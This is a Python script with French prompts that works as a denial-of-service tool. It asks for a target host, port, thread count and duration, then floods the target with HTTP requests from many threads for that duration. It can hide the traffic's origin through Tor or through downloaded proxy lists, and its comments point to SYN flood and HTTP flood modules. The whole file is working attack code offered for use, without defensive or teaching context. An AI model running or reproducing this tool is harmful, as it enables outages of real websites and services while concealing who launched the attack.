import threading
import requests
import time
import sys

from PyRoxy import Proxy
from Sherlock import DownloadFromConfig

def get_user_inputs():
    proxy_mode = input("Mode proxy (tor/liste/non) : ").strip().lower()
    if proxy_mode == "tor":
        proxy_url = None
    elif proxy_mode == "liste":
        proxy_url = input("Lien de la liste de proxies : ").strip()
    elif proxy_mode == "non":
        proxy_url = None
    else:
        print("Mode proxy inconnu, arrêt.")
        sys.exit(1)
    layer = input("Layer d'attaque (4/7) : ").strip()
    target = input("Cible (ex: example.com) : ").strip()
    port = int(input("Port (ex: 80) : ").strip())
    threads = int(input("Nombre de threads : ").strip())
    duration = int(input("Durée de l'attaque (en secondes) : ").strip())
    return proxy_mode, proxy_url, layer, target, port, threads, duration

def get_proxies(proxy_url):
    if proxy_url:
        config = {"proxy-providers": [{"type": 0, "url": proxy_url}]}
        proxies = DownloadFromConfig(config, Proxy_type=0)
        return list(proxies)
    else:
        return []

def worker(url, stop_time, proxy_str):
    session = requests.Session()
    if proxy_str:
        session.proxies = {"http": proxy_str, "https": proxy_str}
    while time.time() < stop_time:
        try:
            response = session.get(url, timeout=5)
            if proxy_str:
                print(f"Requête envoyée via proxy {proxy_str} - Status: {response.status_code}")
            else:
                print(f"Requête envoyée sans proxy - Status: {response.status_code}")
        except Exception as e:
            if proxy_str:
                print(f"Erreur via proxy {proxy_str}: {e}")
            else:
                print(f"Erreur sans proxy: {e}")


def main():
    proxy_mode, proxy_url, layer, target, port, threads, duration = get_user_inputs()
    if proxy_mode == "tor":
        PROXIES = ["socks5h://127.0.0.1:9050"]
    elif proxy_mode == "liste":
        PROXIES = get_proxies(proxy_url)
        if not PROXIES:
            print("Aucun proxy trouvé, arrêt.")
            sys.exit(1)
    elif proxy_mode == "non":
        PROXIES = [None]
    else:
        print("Mode proxy inconnu, arrêt.")
        sys.exit(1)

    # Choix du layer
    if layer == "4":
        print("Attaque Layer 4 (ex: SYN Flood)")
        # Ici, vous pouvez importer et appeler le module L4
        # Exemple: from tools.L4 import syn_flood
        # syn_flood.launch(target, port, threads, duration)
    elif layer == "7":
        print("Attaque Layer 7 (ex: HTTP Flood)")
        # Ici, vous pouvez importer et appeler le module L7
        # Exemple: from tools.L7 import http
        # http.launch(target, port, threads, duration, PROXIES)
    else:
        print("Layer inconnu, arrêt.")
        sys.exit(1)

    # Pour l'exemple, on garde l'ancien worker pour HTTP simple
    url = f"http://{target}:{port}"
    stop_time = time.time() + duration
    thread_list = []
    for i in range(threads):
        proxy_str = PROXIES[i % len(PROXIES)]
        t = threading.Thread(target=worker, args=(url, stop_time, proxy_str))
        t.start()
        thread_list.append(t)
    try:
        for t in thread_list:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Arrêt demandé par l'utilisateur.")
        sys.exit()


if __name__ == "__main__":
    main()
    print("Attaque terminée.")
